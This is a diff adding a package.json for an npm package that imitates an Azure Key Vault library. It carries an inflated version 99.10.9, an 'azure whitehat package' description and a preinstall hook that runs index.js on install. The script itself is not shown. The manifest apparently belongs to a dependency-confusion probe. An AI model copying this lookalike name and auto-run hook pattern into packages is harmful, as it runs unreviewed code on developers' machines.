@@ -1,0 +1,39 @@
+{
+    "name": "azure-keyvault-keys-js",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-keyvault-keys-js@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-9Wf1JCJVJ+dslkBCiBukUWnSZrGROo9bHHuFL6Gc1krPicPeA1iNGRz5wTXmKaEVm0y49F7h36d0r5tfe/vEJQ==",
+        "shasum": "f9510516fdf86327ab7bd81b402f19d8c1b2d322",
+        "tarball": "https://registry.npmjs.org/azure-keyvault-keys-js/-/azure-keyvault-keys-js-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3586,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoShtCRA9TVsSAnZWagAA0mwQAIM8bN5ExP4qxPPuYhtZ\nsFFFWqnl8v/261qbqaKnKSplZPs5zTWeOemLQ7n4X5f+fcpAr27428oZcGmR\n9Np/H+3tChuRwMSW7WVAwUbWhT3imQuJ4IZwKFp8Ec2rU/nezQk//IDzayZC\nUTU3gQ+TwCrkqi2V3kGIRc9OUWKFSG+EnK5XfAWwHd3ejN2u+RraFd5ZMlLY\n8TqGXVDmIHaf2TFDu68KA/iEtOqDGHxWNdSgFON/WHgqVKZNtD8L73FGexTM\nna49xedgMNsXJuCJ4TO0oWNRyCb22JX1QUS977cuZrER4d79+C0hhDeZQALf\n7BrUF/QqrB86kOC1nR8Q+owY091vj1zXKLEvcIPQ5LviWgvJ+2+L9CE2b6J+\n3K7xNTqUkmyGs8wSgzZTOGbxDguyUKuqxI/mVLlSCLlM0orcgBcdByf3u8VD\ngq2KVKGTl3ioN5VadlMmwETkFBjPHe54PzsNrLRZ3CftwOePxyCC7GWGwW7J\nZ20tNjN62LVVQubpPFwahRn+y7dSIgWXLNEt1WvX003wGG73hK4UYhRGFUWc\nMKUCLXVljb631rZP3agGjVrP0JMRd3wDjY9LiWn3KNI7wb3Cqar/ss1ZN/1f\n0RJnUg9onx+Id20X9GshrrEyOHu55ZL4z7lZX5ZFJj4XwMnbGZnA2tsSrhnl\ncrDG\r\n=8rma\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-keyvault-keys-js_99.10.9_1637951596980_0.7759646148518295"
+    },
+    "_hasShrinkwrap": false
+}
